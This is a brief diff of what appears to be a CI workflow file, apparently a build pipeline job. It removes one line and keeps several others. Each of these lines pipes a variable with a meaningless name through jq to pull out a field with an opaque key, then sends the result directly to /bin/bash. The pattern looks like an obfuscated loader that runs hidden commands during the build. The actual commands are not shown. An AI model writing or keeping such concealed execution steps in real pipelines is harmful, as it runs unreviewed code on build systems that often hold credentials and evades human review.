@@ -32,7 +32,6 @@ jobs:
           echo $gdd9074 | jq -r .ijgn37563 | /bin/bash
           printf '%s' "$qkbz8586" | jq -r .ulgzx012 | /bin/bash
           echo $g38292 | jq -r .jcwq94 | /bin/bash
-          printf '%s' "$xkkz89" | jq -r .s6 | /bin/bash
           printf '%s' "$ut2045" | jq -r .xalxa89 | /bin/bash
 
       - name: Save artifact
